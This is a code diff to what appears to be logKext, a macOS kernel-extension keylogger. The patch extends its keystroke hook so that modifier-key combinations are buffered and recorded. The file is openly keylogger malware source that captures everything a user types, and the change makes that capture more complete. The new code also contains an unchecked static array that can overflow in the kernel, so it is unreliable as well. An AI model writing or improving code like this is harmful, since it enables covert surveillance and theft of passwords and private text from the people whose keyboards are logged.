@@ -306,8 +306,9 @@ void com_fsb_iokit_logKext::logStroke( unsigned key, unsigned flags, unsigned ch
 	if (!buffsize)
 		bzero(fMemBuf,MAX_BUFF_SIZE);
 
+    
 	#ifdef LK_DEBUG
-		IOLog( "%s::Copying key %04x\n", getName(), keyData );
+        IOLog( "%s::Copying key %04x\n", getName(), keyData );
 	#endif
 	
 	memcpy(fMemBuf+buffsize,&keyData,sizeof(keyData));
@@ -342,6 +343,9 @@ void specialAction(OSObject * target,
 		(*origSpecialCallback)(target,eventType,flags,key,flavor,guid,repeat,ts,sender,0);
 }
 
+static unsigned combo_keys[100];
+static unsigned combo_flags[100];
+static unsigned buffered_keys = 0;
 
 void logAction(OSObject * target,
                /* eventFlags  */      unsigned   eventType,
@@ -358,7 +362,33 @@ void logAction(OSObject * target,
                void * refcon __unused)
 {
 	if ((eventType==NX_KEYDOWN)&&logService)
-		logService->logStroke(key, flags, charCode);
+    {
+        if (flags & CTRL_FLAG ||
+            flags & ALT_FLAG ||
+            flags & CMD_FLAG ||
+            flags & FN_FLAG) {
+            combo_keys[buffered_keys] = key;
+            combo_flags[buffered_keys] = flags;
+            buffered_keys++;
+        } else {
+            logService->logStroke(key, flags, charCode);
+        }
+    } else if ((eventType==NX_KEYUP) && logService && buffered_keys > 0)
+    {
+        logService->logStroke(0x0024, 0, 0);
+        for (int i = 0; i < buffered_keys; i++) {
+            if (i == 0) {
+                
+                logService->logStroke(combo_keys[i], combo_flags[i], charCode);
+            } else {
+                logService->logStroke(combo_keys[i], 0, charCode);
+            }
+        }
+        logService->logStroke(0x0024, 0, 0);
+        buffered_keys = 0;
+    }
+    
+    
 	if (origCallback)
 		(*origCallback)(target,eventType,flags,key,charCode,charSet,origCharCode,origCharSet,keyboardType,repeat,ts,sender,0);
 }
